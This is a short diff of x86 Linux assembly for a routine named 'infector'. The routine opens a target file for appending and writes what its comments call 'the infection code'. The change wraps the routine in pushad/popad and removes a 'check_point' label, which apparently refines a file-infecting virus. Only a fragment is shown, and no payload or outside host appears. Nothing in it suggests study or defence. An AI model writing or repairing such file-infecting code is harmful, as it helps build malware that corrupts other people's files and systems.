@@ -70,6 +70,7 @@ infector:
     push ebp
     mov ebp, esp
     sub esp, 4
+    pushad
 
     ; Open the file for appending
     mov eax, sys_open
@@ -77,7 +78,6 @@ infector:
     mov ecx, O_WRONLY | O_APPEND
     mov edx, 0
     int 0x80
-check_point:
     mov [ebp-4], eax
 
     ; Write the infection code to the file
@@ -92,6 +92,7 @@ check_point:
     mov ebx, [ebp-4]
     int 0x80
 
+    popad
     add esp, 4
     pop ebp
     ret
